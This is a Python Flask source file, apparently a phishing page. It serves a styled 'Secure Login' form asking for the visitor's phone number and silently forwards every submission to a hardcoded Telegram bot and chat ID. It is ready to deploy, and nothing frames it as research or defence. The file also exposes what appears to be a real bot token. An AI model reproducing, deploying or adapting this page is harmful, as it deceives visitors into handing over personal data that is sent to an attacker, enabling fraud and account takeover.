from flask import Flask, request, render_template_string
import requests
import os

app = Flask(__name__)

# Replace with your Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = "7974594923:AAEfqbs8waKbUR8b1RhUlJRY3SeJJNu0xxs"
CHAT_ID = "6760634615"

def send_to_telegram(number):
    """Send the entered number to the Telegram bot."""
    message = f"📲 New Phone Number: {number}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=payload)

@app.route("/", methods=["GET", "POST"])
def login():
    login_page = """
        <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Poppins', sans-serif;
            }
            body {
                background: linear-gradient(to right, #141e30, #243b55);
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .login-container {
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(12px);
                padding: 25px;
                border-radius: 10px;
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
                text-align: center;
                width: 350px;
                color: white;
                animation: fadeIn 1s ease-in-out;
            }
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(-20px); }
                to { opacity: 1; transform: translateY(0); }
            }
            h2 {
                margin-bottom: 20px;
                font-size: 24px;
            }
            input {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                background: rgba(255, 255, 255, 0.2);
                color: white;
                text-align: center;
                outline: none;
            }
            input::placeholder {
                color: rgba(255, 255, 255, 0.7);
            }
            button {
                width: 100%;
                padding: 12px;
                background: #0084ff;
                color: white;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                cursor: pointer;
                transition: all 0.3s ease;
            }
            button:hover {
                background: #0066cc;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>🔐 Secure Login</h2>
            <form method="post">
                <input type="text" name="number" placeholder=" Enter your number" required>
                <button type="submit">Send</button>
            </form>
        </div>
    </body>
    </html>
    """
    
    if request.method == "POST":
        number = request.form["number"]
        send_to_telegram(number)
      

    return render_template_string(login_page)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Railway assigns a port
    app.run(host="0.0.0.0", port=port)